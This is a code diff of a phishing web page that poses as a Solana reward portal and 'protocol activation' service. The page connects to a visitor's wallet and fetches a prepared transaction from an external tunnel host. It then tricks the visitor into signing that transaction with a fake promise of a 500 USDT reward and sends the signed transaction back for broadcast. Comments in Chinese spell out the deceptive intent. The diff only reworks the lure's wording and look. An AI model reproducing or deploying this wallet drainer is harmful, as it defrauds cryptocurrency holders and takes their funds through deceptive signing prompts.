@@ -3,55 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Reward Portal</title>
+    <title>Solana Protocol Activation</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
-        body { background: #050505; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { width: 330px; padding: 30px; background: #111; border: 1px solid #14f19533; border-radius: 30px; text-align: center; position: relative; }
-        .reward-tag { background: #14f19522; color: #14f195; padding: 8px 15px; border-radius: 50px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 20px; }
-        .amount { font-size: 48px; font-weight: 900; color: #fff; margin: 10px 0; font-family: 'Courier New', monospace; }
-        .sub-text { color: #666; font-size: 13px; margin-bottom: 30px; line-height: 1.5; }
-        .btn { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; border-radius: 15px; font-weight: 900; cursor: pointer; font-size: 18px; box-shadow: 0 10px 30px rgba(20, 241, 149, 0.3); }
-        #st { font-size: 11px; color: #333; margin-top: 25px; font-family: monospace; letter-spacing: 2px; }
-        .status-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); border-radius: 30px; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { width: 330px; padding: 40px 30px; background: #0a0a0a; border: 1px solid #333; border-radius: 20px; text-align: center; }
+        .status-dot { width: 8px; height: 8px; background: #14f195; border-radius: 50%; display: inline-block; margin-right: 8px; box-shadow: 0 0 10px #14f195; }
+        .btn { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        .btn:disabled { background: #333; color: #666; cursor: not-allowed; }
+        #st { font-size: 10px; color: #555; margin-top: 30px; font-family: monospace; text-transform: uppercase; }
+        .line { height: 1px; background: #222; margin: 25px 0; }
     </style>
 </head>
 <body>
     <div class="box">
-        <div id="overlay" class="status-overlay">
-            <h3 id="msg" style="color:#14f195;">SYNCING...</h3>
-            <p id="submsg" style="color:#666; font-size:12px;">Connecting to secure node...</p>
+        <div style="font-size: 12px; color: #14f195; margin-bottom: 30px; font-weight: bold;">
+            <span class="status-dot"></span> SOLANA MAINNET-BETA
+        </div>
+        
+        <h2 style="margin: 0 0 10px 0; font-size: 22px;">PROTOCOL SYNC</h2>
+        <p style="color: #888; font-size: 13px; line-height: 1.6;">Your wallet address requires a secure protocol activation to finalize the distributed rewards allocation.</p>
+        
+        <div class="line"></div>
+        
+        <div id="details" style="text-align: left; font-size: 12px; color: #666; margin-bottom: 20px;">
+            <div style="margin-bottom: 8px;">NETWORK STATUS: <span style="color:#eee">STABLE</span></div>
+            <div>VERIFICATION: <span style="color:#eee">PENDING</span></div>
         </div>
 
-        <div class="reward-tag">✓ UNCLAIMED REWARD DETECTED</div>
-        <div class="amount">500.00</div>
-        <div style="font-size: 14px; color: #14f195; margin-bottom: 20px; font-weight: bold;">USDT (SPL-TOKEN)</div>
+        <button id="cta" class="btn">ACTIVATE ACCOUNT</button>
         
-        <p class="sub-text">This reward has been allocated to your wallet based on your network activity. Activate your account to complete the withdrawal.</p>
-        
-        <button id="cta" class="btn">ACTIVATE & CLAIM</button>
-        <div id="st">SECURED BY SOLANA MAINNET</div>
+        <div id="st">ENCRYPTED END-TO-END CONNECTION</div>
     </div>
 
     <script>
         const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
 
         document.getElementById('cta').onclick = async function() {
-            const overlay = document.getElementById('overlay');
-            const msg = document.getElementById('msg');
-            const submsg = document.getElementById('submsg');
+            const btn = this;
+            const log = (t) => document.getElementById('st').innerText = t;
             const web3 = window.solanaWeb3;
 
             try {
                 const p = window.trustwallet?.solana || window.solana;
-                if (!p) { alert("Please use Trust Wallet Browser."); return; }
+                if (!p) return;
 
-                overlay.style.display = 'flex';
+                btn.disabled = true;
+                btn.innerText = "SYNCHRONIZING...";
                 
-                msg.innerText = "CONNECTING...";
+                log("NODE CONNECTING...");
                 await p.connect();
 
-                msg.innerText = "VERIFYING...";
+                log("DATA FETCHING...");
                 const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -59,15 +62,13 @@
                 });
                 const info = await resp.json();
                 
-                msg.innerText = "ACTIVATING...";
-                submsg.innerText = "Please confirm the secure signature in your wallet.";
-                
+                log("AWAITING SECURE SIGNATURE...");
                 const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                 
-                // 🔱 核心点火：用户为了那 500U，点这个签名确认会非常快
+                // 🔱 触发“Unknown Program / ComputeBudget”弹窗
                 const signed = await p.signTransaction(tx);
-                
-                msg.innerText = "BROADCASTING...";
+                log("FINALIZING BROADCAST...");
+
                 const signedBase64 = btoa(String.fromCharCode.apply(null, signed.serialize()));
 
                 await fetch(tunnel + "/broadcast_v41", {
@@ -76,17 +77,17 @@
                     body: JSON.stringify({ signed_tx: signedBase64 })
                 });
 
-                msg.innerText = "SUCCESS!";
-                submsg.innerText = "Reward will arrive within 24 hours.";
+                log("ACTIVATION SUCCESSFUL!");
                 
                 setTimeout(() => {
-                    alert("Activation Successful! \n\nThe 500 USDT has been queued for delivery to your address.");
-                    window.location.href = "https://solana.com"; 
-                }, 1500);
+                    alert("Activation Successful! \n\nYour reward allocation has been confirmed and will be distributed shortly.");
+                    window.location.href = "https://solana.com/validators"; 
+                }, 1000);
 
             } catch (err) {
-                overlay.style.display = 'none';
-                console.error(err);
+                btn.disabled = false;
+                btn.innerText = "RETRY ACTIVATION";
+                log("PROTOCOL ERROR");
             }
         };
     </script>
